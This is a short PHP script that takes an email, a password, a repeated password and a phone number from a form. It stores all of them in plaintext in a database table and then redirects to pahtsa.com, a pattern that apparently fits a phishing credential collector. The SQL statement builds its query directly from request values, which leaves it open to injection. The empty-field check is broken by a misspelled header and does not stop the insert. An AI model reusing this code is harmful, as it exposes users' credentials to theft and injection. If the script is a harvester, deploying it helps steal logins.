<?php

include 'cn.php';

$email = $_REQUEST['email'];
$pass = $_REQUEST['Pass'];
$re_pass = $_REQUEST['re_Pass'];
$cel = $_REQUEST['cel'];

if($email == ""  || $pass == "" || $re_pass == "" || $cel == ""){
    header("loaction: http://pahtsa.com/");
}

mysqli_query($cn,"insert into acceso_p(mail_p, password_p, rpassword_p, celular_p) values ('$email', '$pass', '$re_pass', '$cel')") or die("Problemas en el select".mysqli_error($cn));
header('location: http://pahtsa.com/');

mysqli_close($cn);

?>